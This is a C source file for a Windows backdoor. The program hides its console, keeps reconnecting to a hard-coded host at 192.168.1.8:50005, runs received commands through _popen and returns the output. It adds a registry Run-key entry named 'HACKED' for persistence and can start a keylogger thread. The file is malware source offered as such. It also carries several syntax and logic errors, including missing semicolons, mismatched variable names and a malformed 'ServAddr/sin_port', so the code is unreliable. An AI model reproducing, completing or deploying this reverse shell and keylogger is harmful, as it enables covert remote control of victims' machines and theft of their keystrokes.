#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "keylogger.h"

#define bzero(p, size) (void) memset((p), 0, (size))

int sock;

int bootRun() {
        char err[128] = "Failed\n";
        char suc[128] = "Created Persistence At: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n"
        TCHAR szPath[MAX_PATH];
        DWORD pthLen = 0;

        pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
        if (pathLen == 0) {
                send(sock, err, sizeof(err), 0);
                return -1;
        }

        HKEY NewVal;

        if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
                send(sock, err, sizeof(err), 0);
                return -1;
        }
        DWORD pathLenInBytes = pathLen * sizeof(*szPath);
        if (RegSetValueEx(NewVal, TEXT("HACKED"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
                RegCloseKey(NewVal);
                send(sock, err, sizeof(err), 0);
                return -1
        }
        RegCloseKey(NewVal);
        send(sock, suc, sizeof(suc), 0);
        return 0;
}

void Shell() {
        char buffer[1024];
        char container[1024];
        char total_response[18384];

        while (1) {
                jump:
                bzero(buffer,1024);
                bzero(container, sizeof(container));
                bzero(total_response, sizeof(total_response));
                recv(sock, buffer, 1024, 0);

                if (strncmp("q", buffer, 1) == 0) {
                        closesocket(sock);
                        WSACleanup();
                        exit(0);
                }
                else if (strncmp("cd ", buffer, 3)) {
                        chdir()
                }
                else if (strncmp("keylog_start", buffer, 12) == 0){
                        HANDLE thread = CreateThread(NULL, 0, logg, NULL, 0, NULL);
                        goto jump;
                }
                else {
                        FILE *fp;
                        fp = _popen(buffer, "r")
                        while(fgets(container,1024,fp) != NULL) {
                                strcat(total_response, container);
                        }
                        send(sock, total_response, sizeof(total_response), 0);
                        fclose(fp);
                }
        }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {

    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);

    ShowWindow(stealth, 0);

    struct sockaddr in ServAddr;
    unsigned short ServPort;
    char *ServIP;
    WSADATA wsaData;

    ServIP = "192.168.1.8";
    ServPort = 50005;

    if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
        exit(1);
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);

    memset(&ServAddr, 0, sizeof(ServAddr));
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServIP);
    ServAddr/sin_port = htons(ServPort);

    start:
    while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
          Sleep(10);
          goto start;
    }
    MessageBox(NULL, TEXT("Your Device Has Been Hacked"), TEXT("Windows Installer"), MB_OK | MB_ICONERROR)
    Shell();
}

